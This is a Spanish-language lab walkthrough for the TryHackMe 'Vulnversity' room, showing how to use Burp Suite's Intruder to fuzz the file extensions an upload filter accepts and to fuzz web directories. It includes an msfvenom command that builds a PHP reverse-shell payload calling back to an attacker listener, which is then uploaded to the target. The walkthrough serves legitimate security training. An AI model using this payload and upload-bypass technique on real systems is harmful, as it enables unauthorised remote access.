# Burp Suite – Uso del Intruder

Maquinas a utilizar **Kali Linux y  Laboratorio de Try Hack Me  Vulnversity**  [https://tryhackme.com/room/vulnversity](https://tryhackme.com/room/vulnversity)

 

Una funcionalidad muy poderosa que tiene burp suite es el intruder, el cual nos permitirá realizar ataques de diccionarios en cualquier parte de nuestras peticiones HTTP. Por lo que en esta ocasión, veremos cómo hacer fuzzing utilizando un diccionario con burp suite.

- Como hicimos anteriormente ponemos la configuración del navegador web.
    
    **Ajustes → Settings**
    
    **General→ Network Settings**
    
    **Manual proxy configuration**
    
    **HTTP Proxy: 127.0.0.1  Port: 8080**
    

- Activamos la interceptación en BurpSuite
    
    **Proxy → intercept on**
    
- Subimos el archivo malicioso que habíamos creado con el siguiente comando:
    
    ```bash
    msfvenom -p php/reverse_php LHOST=10.21.166.149 LPORT=443 -f raw > pwned2.php 
    ```
    
    ![image.png](./imagenes/image%20122.png)
    
    ![image.png](./imagenes/image%20123.png)
    

- Vamos a enviar la petición al **Intruder.** Damos clip derecho y **Send to Intruder.**
    
    ![image.png](./imagenes/image%20124.png)
    

![image.png](./imagenes/image%20125.png)

- Seleccionamos todo y pulsamos en el botón Clear.
    
    ![image.png](./imagenes/image%20126.png)
    
- En un terminal creamos un archivo txt donde vamos a meter nombre de extensiones, las que se nos ocurran.
    
    ```bash
    nano extensiones.txt
    ```
    
    ![image.png](./imagenes/image%20127.png)
    

- Vamos a decirle a BurpSuite que vaya probado línea a línea del archivo extensiones.txt hasta acertar con la extensión.
    
    Escogemos el texto donde quiero aplicar la sustitución y pulsamos el **botón Add.**
    
    ![image.png](./imagenes/image%20128.png)
    
    ![image.png](./imagenes/image%20129.png)
    

- Nos vamos a la **pestaña Settings** dentro de **Intruder.**
    
    ![image.png](./imagenes/image%20130.png)
    

- En **Grep - Extrac**t , activamos la casilla “**Extract the following items…**” esta parte es importante ya que así sabremos si un intento fue exitoso o no. Y pulsamos el botón **Add**
    
    ![image.png](./imagenes/image%20131.png)
    

- Pulsamos en el botón **Fetch response**
    
    ![image.png](./imagenes/image%20132.png)
    
    ![image.png](./imagenes/image%20133.png)
    

- Selecciono el mensaje de error y pulsamos OK
    
    ![image.png](./imagenes/image%20134.png)
    
    BurpSuit nos guarda la regla.
    
    ![image.png](./imagenes/image%20135.png)
    
    Cuando el mensaje sea diferente nos lo indicara.
    

- Nos vamos a la pestaña **Payloads**. Y en **Payload configuration** pulsamos en el botón **Load** para cargar muestro archivo de  extensiones.txt.
    
    ![image.png](./imagenes/image%20136.png)
    
    ![image.png](./imagenes/image%20137.png)
    
- Pulsamos en el botón **Star attack**
    
    ![image.png](./imagenes/image%20138.png)
    
    ![image.png](./imagenes/image%20139.png)
    

---

Con BurpSuite en caso de no tener otras herramientas también podríamos hacer **Fuzzing Web.**

- Activamos **intercept on en BurpSuite**
- En el navegador ponemos la URL de la pagina web `http://10.10.15.36:3333/`
    
    ![image.png](./imagenes/image%20140.png)
    
    ![image.png](./imagenes/image%20141.png)
    

- Añadimos lo **/test** a la primera línea de la siguiente forma y lanzamos el **Intruder**
    
    ![image.png](./imagenes/image%20142.png)
    

- Escogemos tests y pulsamos Add
    
    ![image.png](./imagenes/image%20143.png)
    

- Pestaña **Payload** y en **Payload confiration** le añadiríamos en **Load la ubicación del diccionario (que no sea muy grande o se bloquea)** a utilizar o mediante el botón de **add** le podríamos **manualmente** la palabras que queremos que nos busque.
    
    ![image.png](./imagenes/image%20144.png)
    

- Pulsamos en **Start attack**
    
    ![image.png](./imagenes/image%20145.png)